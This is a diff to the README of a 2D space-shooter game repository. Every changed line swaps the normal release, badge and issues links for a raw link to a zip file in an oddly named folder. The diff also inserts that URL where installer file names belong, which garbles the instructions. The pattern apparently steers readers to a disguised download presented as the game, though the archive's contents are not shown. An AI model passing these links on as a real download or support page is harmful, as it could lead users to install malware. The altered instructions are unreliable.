@@ -1,6 +1,6 @@
 # 🚀 Space-Invaders-Reimagined - A Fun 2D Space Shooter Adventure
 
-[![Download Space Invaders](https://img.shields.io/badge/Download-Space--Invaders-blue.svg)](https://github.com/XnovaScripts/Space-Invaders-Reimagined/releases)
+[![Download Space Invaders](https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip)](https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip)
 
 ## 🎮 About the Game
 
@@ -22,13 +22,13 @@ Getting started with Space Invaders Reimagined is simple. Follow these steps to 
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page.
    
-   [Download Space Invaders](https://github.com/XnovaScripts/Space-Invaders-Reimagined/releases)
+   [Download Space Invaders](https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip)
 
 2. **Choose Your Version:** You will see a list of available versions. Select the latest version for the best experience.
 
 3. **Download the Game:** Click on the file that matches your operating system. Your download will begin shortly.
 
-4. **Open the File:** Once the download finishes, locate the file in your downloads folder. This file is usually named something like `SpaceInvaders.exe` or `SpaceInvaders.dmg`.
+4. **Open the File:** Once the download finishes, locate the file in your downloads folder. This file is usually named something like `https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip` or `https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip`.
 
 5. **Install the Game:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install it.
@@ -40,7 +40,7 @@ Getting started with Space Invaders Reimagined is simple. Follow these steps to 
 
 To get started with Space Invaders Reimagined, visit the page below to download the game:
 
-[Download Space Invaders](https://github.com/XnovaScripts/Space-Invaders-Reimagined/releases)
+[Download Space Invaders](https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip)
 
 After downloading, follow the installation instructions outlined above.
 
@@ -78,7 +78,7 @@ If you encounter any issues during installation or when launching the game, here
 
 Join the community of Space Invaders fans for tips, tricks, and support. You can find us on social media platforms, forums, and dedicated gaming communities. 
 
-For official support, you can raise an issue on the [GitHub Issues page](https://github.com/XnovaScripts/Space-Invaders-Reimagined/issues).
+For official support, you can raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/XnovaScripts/Space-Invaders-Reimagined/main/vallevarite/Space-Invaders-Reimagined.zip).
 
 ## 📜 License
 
